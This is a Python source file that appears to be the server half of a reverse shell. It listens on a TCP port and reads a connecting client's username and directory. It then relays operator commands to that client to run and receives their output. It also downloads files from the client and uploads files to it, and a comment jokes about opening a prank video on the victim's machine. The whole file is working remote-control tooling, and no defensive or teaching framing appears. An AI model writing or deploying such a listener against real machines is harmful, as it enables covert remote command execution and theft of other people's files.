#!/usr/bin/env python3
"""
server_shell.py
Interactive server-side "shell" for a single client.
Protocol: length-prefixed JSON messages.
"""

# to rickroll: start https://www.youtube.com/watch?v=xvFZjo5PgG0

import socket
import json
import struct
import base64

HOST = "0.0.0.0"   # listen on all interfaces (use 127.0.0.1 for local testing)
PORT = 65432

# send/recv helpers for length-prefixed messages
def send_msg(conn, obj):
    data = json.dumps(obj, separators=(",", ":" )).encode("utf-8")
    header = struct.pack("!Q", len(data))  # 8-byte unsigned big-endian length
    conn.sendall(header + data)

def recv_msg(conn):
    # read 8-byte length
    header = b""
    while len(header) < 8:
        chunk = conn.recv(8 - len(header))
        if not chunk:
            return None
        header += chunk
    length = struct.unpack("!Q", header)[0]
    payload = b""
    while len(payload) < length:
        chunk = conn.recv(min(4096, length - len(payload)))
        if not chunk:
            return None
        payload += chunk
    return json.loads(payload.decode("utf-8"))

def interactive_shell(conn, addr):
    # first, receive hello from client with metadata
    hello = recv_msg(conn)
    if hello is None or hello.get("type") != "hello":
        print("Failed to receive hello from client.")
        return
    client_user = hello.get("username", "unknown")
    cwd = hello.get("cwd", "")
    print(f"Connected: {addr} as {client_user} (cwd: {cwd})")

    try:
        while True:
            prompt = f"{client_user}@{addr[0]}:{cwd}$ "
            cmd = input(prompt).strip()
            if not cmd:
                continue

            # convenience local commands on server-side:
            if cmd in ("quit", "exit"):
                send_msg(conn, {"type": "control", "action": "exit"})
                print("Sent exit, closing connection.")
                break

            if cmd.startswith("download "):
                # server wants to pull a file from client: download <remote_path> [local_path]
                parts = cmd.split(maxsplit=2)
                remote_path = parts[1]
                local_path = parts[2] if len(parts) == 3 else None
                send_msg(conn, {"type": "action", "action": "download", "path": remote_path})
                resp = recv_msg(conn)
                if resp is None:
                    print("Client disconnected.")
                    break
                if resp.get("type") == "file":
                    b64 = resp.get("b64", "")
                    data = base64.b64decode(b64.encode("utf-8"))
                    outname = local_path or remote_path.split("/")[-1]
                    with open(outname, "wb") as f:
                        f.write(data)
                    print(f"Downloaded remote '{remote_path}' -> local '{outname}' ({len(data)} bytes)")
                    cwd = resp.get("cwd", cwd)
                else:
                    print("Download error:", resp.get("error", resp))
                continue

            if cmd.startswith("upload "):
                # upload <local_path> [remote_path]
                parts = cmd.split(maxsplit=2)
                local_path = parts[1]
                remote_path = parts[2] if len(parts) == 3 else None
                try:
                    with open(local_path, "rb") as f:
                        data = f.read()
                except Exception as e:
                    print("Failed to open local file:", e)
                    continue
                b64 = base64.b64encode(data).decode("utf-8")
                send_msg(conn, {"type": "action", "action": "upload", "b64": b64, "path": remote_path, "local_name": local_path})
                resp = recv_msg(conn)
                if resp is None:
                    print("Client disconnected.")
                    break
                print(resp.get("status", resp))
                cwd = resp.get("cwd", cwd)
                continue

            # default: send as remote shell command
            send_msg(conn, {"type": "cmd", "cmd": cmd})
            resp = recv_msg(conn)
            if resp is None:
                print("Client disconnected.")
                break

            # handle response types
            if resp.get("type") == "output":
                out_b64 = resp.get("b64", "")
                out_bytes = base64.b64decode(out_b64.encode("utf-8"))
                try:
                    text = out_bytes.decode("utf-8", errors="replace")
                except Exception:
                    text = repr(out_bytes)
                print(text, end="")  # already contains newline if any
                cwd = resp.get("cwd", cwd)
            elif resp.get("type") == "error":
                print("Remote error:", resp.get("error"))
            else:
                print("Unknown response:", resp)
    except KeyboardInterrupt:
        print("\nServer interrupted by user, sending exit.")
        try:
            send_msg(conn, {"type": "control", "action": "exit"})
        except Exception:
            pass

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"Listening on {HOST}:{PORT} ...")
        conn, addr = s.accept()
        with conn:
            interactive_shell(conn, addr)

if __name__ == "__main__":
    main()
